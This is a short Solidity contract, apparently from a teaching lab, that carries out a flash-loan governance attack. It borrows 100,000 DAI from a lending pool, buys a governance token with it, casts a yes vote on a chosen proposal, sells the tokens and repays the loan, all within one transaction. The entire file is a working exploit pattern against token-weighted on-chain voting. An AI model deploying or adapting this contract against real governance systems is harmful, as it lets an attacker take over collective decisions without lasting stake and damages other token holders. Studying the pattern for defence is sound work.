// SPDX-License-Identifier: MIT
pragma solidity 0.7.5;

import "./Govern.sol";
import "./interfaces/ILendingPool.sol";

contract FlashVoter {
    ILendingPool constant pool = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    uint constant borrowAmount = 100000 ether;

    Govern public governanceToken;
    uint public proposalId;

    constructor(Govern _governanceToken, uint _proposalId) {
        // 1. Setup 
        governanceToken = _governanceToken;
        proposalId = _proposalId;
    }

    function flashVote() external {
        // 2. Flash Loan
        address[] memory assets = new address[](1);
        assets[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        // 4.1 Flash Vote
        amounts[0] = borrowAmount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        pool.flashLoan(address(this), assets, amounts, modes, address(0), "", uint16(0));
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, bytes calldata
    ) external returns(bool) {
        // 4.2 Flash Vote
        DAI.approve(address(governanceToken),amounts[0]);
        governanceToken.buy(amounts[0]);
        governanceToken.vote(proposalId,true);
        governanceToken.sell(amounts[0]);
        DAI.approve(address(pool),amounts[0]+premiums[0]);
        return true;
    }
}